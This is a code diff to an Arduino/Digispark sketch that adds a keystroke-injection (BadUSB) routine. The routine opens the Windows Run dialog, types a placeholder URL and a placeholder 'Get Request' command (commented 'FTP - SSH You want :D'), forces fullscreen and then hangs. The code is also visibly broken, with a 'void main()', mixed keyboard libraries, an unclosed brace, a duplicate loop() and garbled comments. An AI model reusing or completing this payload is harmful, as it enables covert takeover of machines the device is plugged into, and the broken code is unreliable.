@@ -14,4 +14,20 @@ void main()
   Keyboard.end();
 }
 
-void loop() {} // Unused
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("example.com"); // link regsion
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("Get Request"); // FTP - SSH You want :D
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_F11);
+  for(;;){ /*empty*/ }
+  
+void loop() {} // unnnnnsed zzzhh
